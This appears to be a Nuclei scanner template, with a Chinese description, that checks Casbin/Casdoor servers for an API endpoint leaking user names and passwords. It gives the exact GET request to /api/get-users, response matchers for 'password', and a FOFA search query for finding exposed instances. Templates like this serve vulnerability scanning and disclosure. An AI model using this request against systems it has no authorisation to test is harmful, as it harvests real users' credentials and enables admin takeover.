id: casbin-password-leaks
info:
  name: casbin
  author: clearlu3
  severity: high
  description: |-
    Casbin是一个支持如ACL,RBAC,ABAC等访问模型，
    可用于Golang,Java,C/C++,Node.js,Javascript,PHP,Laravel,Python,.NET(C#),Delphi,Rust,Ruby,Lua(OpenResty),Dart(Flutter)和Elixir的授权库。
    Casbin的api接口存在账号密码泄漏漏洞，攻击者通过漏洞可以获取web后台权限。
    fofa：title="Casdoor"
  references: https://mp.weixin.qq.com/s/6f3aBZXxRHIJQIsEDnG5OQ
  tags: casbin,infoleaks,http

requests:
  - method: GET
    path:
      - '{{BaseURL}}/api/get-users?p=123&pageSize=123'
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - name
          - password
        condition: and
        part: body
    
    matchers-condition: and
